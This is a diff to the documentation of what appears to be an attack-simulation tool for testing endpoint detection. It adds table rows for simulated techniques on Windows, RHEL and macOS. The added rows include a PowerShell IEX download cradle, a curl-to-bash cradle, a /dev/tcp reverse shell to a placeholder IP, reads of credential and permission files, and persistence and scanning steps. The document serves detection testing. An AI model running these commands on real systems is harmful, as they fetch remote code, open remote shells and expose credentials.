@@ -183,6 +183,7 @@ so they are easy to filter in a SIEM or log file.
 | Scheduled task | `schtasks /create` then `/delete` — persistence attempt with cleanup |
 | VSS / backup recon | `vssadmin list shadows`, `wbadmin get status`, `bcdedit /enum` — ransomware pre-stage pattern |
 | LSASS handle request | `OpenProcess(PROCESS_ALL_ACCESS)` on the LSASS PID — credential dumping precursor |
+| PowerShell IEX | `IEX (New-Object Net.WebClient).DownloadString(url)` — Invoke-Expression is the most-signatured PS technique |
 
 #### RHEL / CentOS
 
@@ -190,12 +191,18 @@ so they are easy to filter in a SIEM or log file.
 |---|---|
 | Bash recon chain | 9-command recon chain via `bash -c` — creates suspicious `python→bash→tools` process tree |
 | Bash encoded command | `bash -c "$(echo <base64> \| base64 -d)"` — Linux obfuscation equivalent |
+| curl\|bash cradle | `curl URL \| bash` — the single most-flagged Linux download-and-exec pattern |
 | curl/wget download cradle | Downloads from a safe echo endpoint to simulate payload retrieval |
+| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444 0>&1` — most common post-exploitation technique, heavily signatured |
 | /etc/shadow read | Actually `open()`s `/etc/shadow` — generates credential-access telemetry |
 | SUID binary search | `find /usr -perm -4000` — standard privilege escalation recon |
+| sudo recon | `sudo -l` / `cat /etc/sudoers` — first-step privilege enumeration after shell access |
 | Cron persistence | Writes a test crontab entry then removes it immediately |
+| systemd persistence | Writes a user-level `.service` unit, enables it, disables it, removes it |
 | ptrace attempt | `ptrace(PTRACE_ATTACH, 1)` on init/systemd — process injection precursor |
 | Directory traversal | Lists `/etc`, `/var/log`, `/root`, `~/.ssh`, `/tmp` |
+| /proc access | Opens `/proc/1/maps`, `/proc/1/cmdline`, `/proc/1/environ` — memory recon pattern |
+| nmap subnet scan | Runs `nmap --top-ports 20` against local /24 — uses the actual binary, much more detectable than raw sockets |
 | rpm -Va integrity check | Verifies package file integrity — used to find tampered binaries |
 | yum/dnf package recon | Lists all installed packages via yum or dnf |
 
@@ -214,13 +221,19 @@ Same as RHEL, plus:
 |---|---|
 | Bash recon chain | Multi-command recon via `bash -c` intermediary |
 | Bash encoded command | Same base64 decode+exec technique as Linux |
+| curl\|bash cradle | `curl URL \| bash` — top-flagged download-and-exec pattern |
 | curl download cradle | Simulates payload retrieval |
-| /etc/shadow read | Actually opens `/etc/shadow` — generates credential-access telemetry |
+| Reverse shell simulation | `bash -i >& /dev/tcp/192.0.2.100/4444 0>&1` |
 | SUID binary search | Scans `/usr` for setuid binaries |
+| sudo recon | `sudo -l` / `cat /etc/sudoers` |
+| nmap subnet scan | Runs `nmap --top-ports 20` against local /24 |
 | Directory traversal | Lists sensitive directories |
 | Keychain access | `security list-keychains` and `find-generic-password` |
 | LaunchAgent persistence | Writes and loads a test `.plist`, then immediately unloads and deletes it |
 | macOS-specific recon | `dscl`, `networksetup`, `system_profiler`, `defaults read` |
+| TCC database access | Opens `~/Library/Application Support/com.apple.TCC/TCC.db` — app permission database |
+| Gatekeeper recon | `spctl --status`, `codesign --verify`, `csrutil status` — security posture enumeration |
+| osascript execution | AppleScript via `osascript` — used for persistence and privilege escalation |
 
 ---
 
